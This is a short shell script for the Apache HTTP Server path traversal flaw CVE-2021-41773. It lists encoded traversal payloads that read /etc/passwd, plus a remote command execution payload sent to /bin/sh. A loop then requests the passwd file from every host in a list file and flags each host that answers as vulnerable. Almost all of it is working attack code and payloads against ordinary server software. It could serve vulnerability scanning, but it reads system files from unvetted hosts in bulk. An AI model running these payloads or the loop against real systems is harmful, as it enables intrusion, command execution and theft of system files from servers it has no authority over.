# Apache-CVE-2021-41773.sh

# PAYLOAD 1 # http://$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
# PAYLOAD 2 # http://$host/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# PAYLOAD 3 # http://$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# PAYLOAD 4 # http://$host/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# PAYLOAD 5 - RCE # http://$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh || $ curl --data "A=|echo;id>" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv


for host in $(cat ipapache.txt); do
  REQ=$(curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" --max-time 5 | grep "root:*")

  if [ -z "$REQ" ]; then
      echo "$host is good"
  else
      echo -e "\e[91m$host is vulnerable\e[0m";
  fi
done
